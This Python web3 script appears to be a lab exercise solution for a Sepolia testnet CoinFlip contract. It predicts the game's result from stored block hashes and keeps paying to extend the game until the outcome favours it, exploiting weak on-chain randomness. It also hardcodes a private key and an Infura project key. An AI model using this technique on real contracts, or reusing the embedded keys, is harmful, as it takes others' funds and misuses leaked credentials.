from solcx import compile_source
from web3 import Web3, Account

w3 = Web3(Web3.HTTPProvider(
    'https://sepolia.infura.io/v3/23a668257ecb4ece82ff765e85972ef7'))
assert w3.is_connected(), "Web3 is not connected to the Ethereum network!"
private_key = "0xd0d87fa4b6f9758dd2151efa78671331f206e3327e44eb69837b547c8e62c320"
account = Account.from_key(private_key)
print(account.address)
w3.eth.default_account = account.address

with open("./02_coinflip.sol") as f:
    contract_source_code = f.read()

compiled_sol = compile_source(contract_source_code)
contract_interface = compiled_sol['<stdin>:CoinFlip']

###### DEPLOY CONTRACT ######
# deploy contract on the blockchain by Remix

contract_address = "0x7aa7f55ba04994873DcEc8fF37C1CB0f915a506C"
my_contract = w3.eth.contract(
    address=contract_address,
    abi=contract_interface['abi'])


def call_function(function, *arg, gas_limit=200000, value=0):
    nonce = w3.eth.get_transaction_count(account.address)
    txn = function(*arg).build_transaction({
        'from': account.address,
        'gas': gas_limit,
        'gasPrice': w3.eth.gas_price,
        'nonce': nonce,
        'value': value
    })
    signed_txn = Account.sign_transaction(txn, private_key)
    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
    print(txn_receipt)


call_function(my_contract.functions.deposit, value=500)
starthash = my_contract.functions.starthash().call()
endhash = my_contract.functions.endhash().call()


def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def get_result(start_block_hash, end_block_hash):
    xor_result = byte_xor(start_block_hash, end_block_hash)
    uint256_result = int.from_bytes(xor_result, byteorder='big')
    return uint256_result % 10


while get_result(starthash, endhash) == 1:
    print("Current winner: player2, extending the game")
    call_function(my_contract.functions.extend, value=5100000000000000)
    starthash = my_contract.functions.starthash().call()
    endhash = my_contract.functions.endhash().call()

call_function(my_contract.functions.resolve)
print("Gameover", my_contract.functions.gameover().call(),
      "Winner:", my_contract.functions.winner().call())
# start_block_hash = w3.eth.get_block(gamestart).hash
# end_block_hash = w3.eth.get_block(gameend).hash
# print("python:", start_block_hash, end_block_hash, get_result(
#     start_block_hash, end_block_hash))
